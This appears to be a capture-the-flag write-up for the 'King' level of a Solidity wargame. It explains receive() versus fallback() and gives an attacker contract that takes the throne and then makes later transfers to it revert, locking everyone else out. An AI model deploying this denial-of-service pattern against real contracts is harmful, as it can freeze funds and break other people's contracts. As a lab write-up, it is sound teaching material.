### Level 9 : KING

Date : 24-04-2026

Difficulty : Easy

#### Learning :

| **Feature** | **receive()** | **fallback()** |
| --- | --- | --- |
| **When it runs** | When you send plain ETH (no data). | When you call a function that doesn't exist OR send ETH with data. |
| **Data Requirement** | Must be empty (`msg.data` is empty). | Can handle data (`msg.data` contains something). |
| **Syntax** | `receive() external payable` | `fallback() external [payable]` |
| **Purpose** | To accept ETH safely. | To handle errors, redirect calls (proxies), or accept ETH with data. |

#### Thinking :

```
receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
}
```

-   The first thing that came to my mind is that this function changes its internal state **after** the transaction. That is generally a bad practice because we do not know who the current king is or how they handle incoming transfers on their side. (It could even be another contract.)
-   So now I need to think about how I can become the king through my own contract, which accepts transfers but prevents anyone else from becoming king afterward.
-   I just need to write a `receive()` function in my contract before becoming king. Inside that function, I need to call the `receive()` logic of the King contract again.

Here is my contract to perform a **Denial of Service** attack:

```
contract HelperContract {
    address _owner;
    address payable constant KINGCONTRACT = payable(0xB1b13F676b9eF7072702c42A6CCB423aae3F859A);

    modifier onlyOwner() {
        require(msg.sender == _owner, "Not owner");
        _;
    }

    constructor() {
        _owner = msg.sender;
    }

    function becomeAKing() external payable onlyOwner {
        (bool ok, ) = KINGCONTRACT.call{value: msg.value}("");
        require(ok);
    }

    receive() external payable {
        (bool ok, ) = payable(KINGCONTRACT).call{value: 0.0011 ether}("");
        require(ok);
    }
}

```